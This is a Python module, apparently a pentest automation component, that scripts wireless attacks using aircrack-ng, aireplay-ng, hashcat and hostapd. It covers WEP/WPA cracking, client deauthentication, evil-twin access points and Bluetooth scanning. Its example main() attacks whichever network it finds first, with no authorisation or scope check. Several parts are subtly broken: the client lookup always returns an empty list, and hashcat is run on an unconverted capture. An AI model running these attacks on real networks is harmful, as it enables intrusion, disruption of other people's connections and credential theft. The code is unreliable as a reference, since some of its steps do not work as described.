#!/usr/bin/env python3
"""
Wireless Attacks Tool Category

This module provides automation for wireless security testing tools including:
- WiFi network discovery and analysis
- WEP/WPA/WPA2 cracking
- Evil twin attacks
- Deauthentication attacks
- Rogue access point creation
- Bluetooth security testing
- RFID/NFC security assessment
"""

import asyncio
import logging
import re
import subprocess
import time
from dataclasses import dataclass
from enum import Enum
from typing import Any

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class WirelessAttackType(Enum):
    """Types of wireless attacks."""
    WIFI_DISCOVERY = "wifi_discovery"
    WEP_CRACKING = "wep_cracking"
    WPA_CRACKING = "wpa_cracking"
    WPA2_CRACKING = "wpa2_cracking"
    EVIL_TWIN = "evil_twin"
    DEAUTH_ATTACK = "deauth_attack"
    ROGUE_AP = "rogue_ap"
    BLUETOOTH_SCAN = "bluetooth_scan"
    BLUETOOTH_ATTACK = "bluetooth_attack"
    RFID_SCAN = "rfid_scan"
    NFC_ATTACK = "nfc_attack"


class WirelessProtocol(Enum):
    """Wireless protocols."""
    WEP = "wep"
    WPA = "wpa"
    WPA2 = "wpa2"
    WPA3 = "wpa3"
    BLUETOOTH = "bluetooth"
    RFID = "rfid"
    NFC = "nfc"


@dataclass
class WirelessNetwork:
    """Represents a discovered wireless network."""
    ssid: str
    bssid: str
    channel: int
    signal_strength: int
    encryption: str
    protocol: WirelessProtocol
    clients: list[str] = None
    location: str = None
    first_seen: str = None
    last_seen: str = None


@dataclass
class WirelessClient:
    """Represents a wireless client device."""
    mac_address: str
    ssid: str
    signal_strength: int
    packets_sent: int
    packets_received: int
    vendor: str = None
    device_type: str = None


@dataclass
class AttackResult:
    """Result of a wireless attack."""
    attack_type: WirelessAttackType
    target: str
    success: bool
    details: dict[str, Any]
    timestamp: str
    duration: float
    output: str = None
    error: str = None


class WirelessAttackTools:
    """Main class for wireless attack automation."""

    def __init__(self, config: dict[str, Any] = None):
        """Initialize wireless attack tools."""
        self.config = config or {}
        self.interface = self.config.get('wireless_interface', 'wlan0')
        self.monitor_mode = False
        self.attack_history: list[AttackResult] = []

        # Tool paths
        self.tools = {
            'airodump': 'airodump-ng',
            'aireplay': 'aireplay-ng',
            'aircrack': 'aircrack-ng',
            'wash': 'wash',
            'reaver': 'reaver',
            'bully': 'bully',
            'hcxdumptool': 'hcxdumptool',
            'hcxpcapngtool': 'hcxpcapngtool',
            'hashcat': 'hashcat',
            'john': 'john',
            'bluetoothctl': 'bluetoothctl',
            'hcitool': 'hcitool',
            'l2ping': 'l2ping',
            'rfcomm': 'rfcomm',
            'nfc-list': 'nfc-list',
            'nfc-relay': 'nfc-relay'
        }

        logger.info("Wireless attack tools initialized")

    async def setup_monitor_mode(self) -> bool:
        """Enable monitor mode on wireless interface."""
        try:
            logger.info(f"Setting up monitor mode on {self.interface}")

            # Stop network manager
            await self._run_command(['systemctl', 'stop', 'NetworkManager'])
            await self._run_command(['systemctl', 'stop', 'wpa_supplicant'])

            # Kill interfering processes
            await self._run_command(['airmon-ng', 'check', 'kill'])

            # Enable monitor mode
            result = await self._run_command(['airmon-ng', 'start', self.interface])

            if result['success']:
                self.monitor_mode = True
                self.interface = f"{self.interface}mon"
                logger.info(f"Monitor mode enabled on {self.interface}")
                return True
            else:
                logger.error("Failed to enable monitor mode")
                return False

        except Exception as e:
            logger.error(f"Error setting up monitor mode: {e}")
            return False

    async def discover_networks(self, duration: int = 60) -> list[WirelessNetwork]:
        """Discover wireless networks in the area."""
        try:
            logger.info(f"Starting network discovery for {duration} seconds")

            # Start airodump-ng
            cmd = [
                'airodump-ng',
                '--output-format', 'csv',
                '--write', '/tmp/wireless_scan',
                '--write-interval', '5',
                self.interface
            ]

            # Run discovery in background
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            # Wait for specified duration
            await asyncio.sleep(duration)
            process.terminate()

            # Parse results
            networks = await self._parse_airodump_output('/tmp/wireless_scan-01.csv')

            logger.info(f"Discovered {len(networks)} networks")
            return networks

        except Exception as e:
            logger.error(f"Error during network discovery: {e}")
            return []

    async def _parse_airodump_output(self, file_path: str) -> list[WirelessNetwork]:
        """Parse airodump-ng CSV output."""
        networks = []

        try:
            with open(file_path) as f:
                lines = f.readlines()

            # Skip header lines
            data_lines = [line for line in lines if line.strip() and not line.startswith('Station')]

            for line in data_lines:
                if ',' in line and not line.startswith('BSSID'):
                    parts = line.split(',')
                    if len(parts) >= 14:
                        try:
                            bssid = parts[0].strip()
                            if bssid and bssid != 'BSSID':
                                network = WirelessNetwork(
                                    ssid=parts[13].strip() or 'Hidden',
                                    bssid=bssid,
                                    channel=int(parts[3]) if parts[3].isdigit() else 0,
                                    signal_strength=int(parts[8]) if parts[8].isdigit() else 0,
                                    encryption=parts[5].strip(),
                                    protocol=self._determine_protocol(parts[5].strip())
                                )
                                networks.append(network)
                        except (ValueError, IndexError):
                            continue

        except Exception as e:
            logger.error(f"Error parsing airodump output: {e}")

        return networks

    def _determine_protocol(self, encryption: str) -> WirelessProtocol:
        """Determine wireless protocol from encryption string."""
        encryption_lower = encryption.lower()

        if 'wep' in encryption_lower:
            return WirelessProtocol.WEP
        elif 'wpa' in encryption_lower:
            if 'wpa2' in encryption_lower:
                return WirelessProtocol.WPA2
            elif 'wpa3' in encryption_lower:
                return WirelessProtocol.WPA3
            else:
                return WirelessProtocol.WPA
        else:
            return WirelessProtocol.WPA2  # Default assumption

    async def crack_wep(self, target_network: WirelessNetwork,
                        wordlist: str = None) -> AttackResult:
        """Attempt to crack WEP encryption."""
        try:
            logger.info(f"Starting WEP crack attack on {target_network.ssid}")
            start_time = time.time()

            # Capture packets
            capture_file = f"/tmp/wep_capture_{target_network.bssid.replace(':', '')}"

            # Start packet capture
            capture_cmd = [
                'airodump-ng',
                '--bssid', target_network.bssid,
                '--channel', str(target_network.channel),
                '--write', capture_file,
                self.interface
            ]

            capture_process = await asyncio.create_subprocess_exec(
                *capture_cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            # Wait for IVs to accumulate
            await asyncio.sleep(30)

            # Attempt cracking
            crack_cmd = [
                'aircrack-ng',
                f"{capture_file}-01.cap"
            ]

            if wordlist:
                crack_cmd.extend(['-w', wordlist])

            result = await self._run_command(crack_cmd)
            duration = time.time() - start_time

            # Clean up
            capture_process.terminate()

            attack_result = AttackResult(
                attack_type=WirelessAttackType.WEP_CRACKING,
                target=target_network.ssid,
                success='WEP' in result['output'] if result['success'] else False,
                details={
                    'bssid': target_network.bssid,
                    'channel': target_network.channel,
                    'duration': duration,
                    'ivs_captured': self._extract_iv_count(result['output'])
                },
                timestamp=time.strftime('%Y-%m-%d %H:%M:%S'),
                duration=duration,
                output=result['output'],
                error=result['error']
            )

            self.attack_history.append(attack_result)
            return attack_result

        except Exception as e:
            logger.error(f"Error during WEP crack: {e}")
            return AttackResult(
                attack_type=WirelessAttackType.WEP_CRACKING,
                target=target_network.ssid,
                success=False,
                details={'error': str(e)},
                timestamp=time.strftime('%Y-%m-%d %H:%M:%S'),
                duration=0,
                error=str(e)
            )

    async def crack_wpa(self, target_network: WirelessNetwork,
                        wordlist: str = '/usr/share/wordlists/rockyou.txt') -> AttackResult:
        """Attempt to crack WPA/WPA2 encryption."""
        try:
            logger.info(f"Starting WPA crack attack on {target_network.ssid}")
            start_time = time.time()

            # Capture handshake
            capture_file = f"/tmp/wpa_capture_{target_network.bssid.replace(':', '')}"

            # Start packet capture
            capture_cmd = [
                'airodump-ng',
                '--bssid', target_network.bssid,
                '--channel', str(target_network.channel),
                '--write', capture_file,
                '--output-format', 'cap',
                self.interface
            ]

            capture_process = await asyncio.create_subprocess_exec(
                *capture_cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            # Deauthenticate clients to capture handshake
            await self._deauthenticate_clients(target_network)

            # Wait for handshake
            await asyncio.sleep(60)

            # Attempt cracking with hashcat
            crack_cmd = [
                'hashcat',
                '-m', '22000',  # WPA PMKID mode
                f"{capture_file}-01.cap",
                wordlist,
                '--force'
            ]

            result = await self._run_command(crack_cmd)
            duration = time.time() - start_time

            # Clean up
            capture_process.terminate()

            attack_result = AttackResult(
                attack_type=WirelessAttackType.WPA_CRACKING,
                target=target_network.ssid,
                success='Recovered' in result['output'] if result['success'] else False,
                details={
                    'bssid': target_network.bssid,
                    'channel': target_network.channel,
                    'duration': duration,
                    'handshake_captured': 'handshake' in result['output'].lower()
                },
                timestamp=time.strftime('%Y-%m-%d %H:%M:%S'),
                duration=duration,
                output=result['output'],
                error=result['error']
            )

            self.attack_history.append(attack_result)
            return attack_result

        except Exception as e:
            logger.error(f"Error during WPA crack: {e}")
            return AttackResult(
                attack_type=WirelessAttackType.WPA_CRACKING,
                target=target_network.ssid,
                success=False,
                details={'error': str(e)},
                timestamp=time.strftime('%Y-%m-%d %H:%M:%S'),
                duration=0,
                error=str(e)
            )

    async def _deauthenticate_clients(self, target_network: WirelessNetwork):
        """Deauthenticate clients to capture handshake."""
        try:
            # Get client list
            clients = await self._get_network_clients(target_network)

            for client in clients:
                deauth_cmd = [
                    'aireplay-ng',
                    '--deauth', '10',
                    '--bssid', target_network.bssid,
                    '--target', client.mac_address,
                    self.interface
                ]

                await self._run_command(deauth_cmd)
                await asyncio.sleep(2)

        except Exception as e:
            logger.error(f"Error during deauthentication: {e}")

    async def _get_network_clients(self, target_network: WirelessNetwork) -> list[WirelessClient]:
        """Get list of clients connected to a network."""
        clients = []

        try:
            # Use airodump to get client list
            cmd = [
                'airodump-ng',
                '--bssid', target_network.bssid,
                '--channel', str(target_network.channel),
                '--output-format', 'csv',
                '--write', '/tmp/client_scan',
                self.interface
            ]

            result = await self._run_command(cmd)

            # Parse client list from output
            # This is a simplified implementation
            # In practice, you'd parse the CSV output more carefully

        except Exception as e:
            logger.error(f"Error getting network clients: {e}")

        return clients

    async def create_evil_twin(self, target_network: WirelessNetwork,
                               ssid: str = None) -> AttackResult:
        """Create an evil twin access point."""
        try:
            logger.info(f"Creating evil twin for {target_network.ssid}")
            start_time = time.time()

            # Use hostapd to create AP
            evil_ssid = ssid or f"{target_network.ssid}_FREE"

            hostapd_config = f"""
interface={self.interface}
driver=nl80211
ssid={evil_ssid}
hw_mode=g
channel={target_network.channel}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""

            config_file = f"/tmp/evil_twin_{target_network.bssid.replace(':', '')}.conf"
            with open(config_file, 'w') as f:
                f.write(hostapd_config)

            # Start evil twin
            cmd = ['hostapd', config_file]
            result = await self._run_command(cmd)
            duration = time.time() - start_time

            attack_result = AttackResult(
                attack_type=WirelessAttackType.EVIL_TWIN,
                target=target_network.ssid,
                success=result['success'],
                details={
                    'evil_ssid': evil_ssid,
                    'channel': target_network.channel,
                    'duration': duration
                },
                timestamp=time.strftime('%Y-%m-%d %H:%M:%S'),
                duration=duration,
                output=result['output'],
                error=result['error']
            )

            self.attack_history.append(attack_result)
            return attack_result

        except Exception as e:
            logger.error(f"Error creating evil twin: {e}")
            return AttackResult(
                attack_type=WirelessAttackType.EVIL_TWIN,
                target=target_network.ssid,
                success=False,
                details={'error': str(e)},
                timestamp=time.strftime('%Y-%m-%d %H:%M:%S'),
                duration=0,
                error=str(e)
            )

    async def scan_bluetooth_devices(self) -> list[dict[str, Any]]:
        """Scan for Bluetooth devices."""
        try:
            logger.info("Starting Bluetooth device scan")

            # Use bluetoothctl to scan
            cmd = ['bluetoothctl', 'scan', 'on']
            result = await self._run_command(cmd)

            # Parse discovered devices
            devices = []
            lines = result['output'].split('\n')

            for line in lines:
                if 'Device' in line and ':' in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        mac = parts[1]
                        name = ' '.join(parts[2:]) if len(parts) > 2 else 'Unknown'
                        devices.append({
                            'mac_address': mac,
                            'name': name,
                            'discovered': time.strftime('%Y-%m-%d %H:%M:%S')
                        })

            logger.info(f"Discovered {len(devices)} Bluetooth devices")
            return devices

        except Exception as e:
            logger.error(f"Error during Bluetooth scan: {e}")
            return []

    async def _run_command(self, cmd: list[str]) -> dict[str, Any]:
        """Run a command and return results."""
        try:
            logger.debug(f"Running command: {' '.join(cmd)}")

            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            stdout, stderr = await process.communicate()

            return {
                'success': process.returncode == 0,
                'output': stdout.decode('utf-8', errors='ignore'),
                'error': stderr.decode('utf-8', errors='ignore'),
                'return_code': process.returncode
            }

        except Exception as e:
            logger.error(f"Error running command {' '.join(cmd)}: {e}")
            return {
                'success': False,
                'output': '',
                'error': str(e),
                'return_code': -1
            }

    def _extract_iv_count(self, output: str) -> int:
        """Extract IV count from aircrack output."""
        try:
            # Look for IV patterns in output
            iv_pattern = r'(\d+)\s+IVs'
            match = re.search(iv_pattern, output)
            if match:
                return int(match.group(1))
        except Exception:
            pass
        return 0

    def get_attack_history(self) -> list[AttackResult]:
        """Get history of all attacks performed."""
        return self.attack_history

    def cleanup(self):
        """Clean up resources and restore normal operation."""
        try:
            if self.monitor_mode:
                # Restore normal mode
                subprocess.run(['airmon-ng', 'stop', self.interface],
                             check=False, capture_output=True)
                self.monitor_mode = False

            # Restart network services
            subprocess.run(['systemctl', 'start', 'NetworkManager'],
                         check=False, capture_output=True)

            logger.info("Wireless attack tools cleanup completed")

        except Exception as e:
            logger.error(f"Error during cleanup: {e}")


# Example usage and testing
async def main():
    """Example usage of wireless attack tools."""
    tools = WirelessAttackTools()

    try:
        # Setup monitor mode
        if await tools.setup_monitor_mode():
            # Discover networks
            networks = await tools.discover_networks(duration=30)

            if networks:
                target = networks[0]  # First network found

                # Attempt WEP crack if applicable
                if target.protocol == WirelessProtocol.WEP:
                    result = await tools.crack_wep(target)
                    print(f"WEP crack result: {result.success}")

                # Attempt WPA crack
                elif target.protocol in [WirelessProtocol.WPA, WirelessProtocol.WPA2]:
                    result = await tools.crack_wpa(target)
                    print(f"WPA crack result: {result.success}")

                # Create evil twin
                evil_result = await tools.create_evil_twin(target)
                print(f"Evil twin result: {evil_result.success}")

            # Scan Bluetooth devices
            bluetooth_devices = await tools.scan_bluetooth_devices()
            print(f"Found {len(bluetooth_devices)} Bluetooth devices")

    finally:
        tools.cleanup()


if __name__ == "__main__":
    asyncio.run(main())
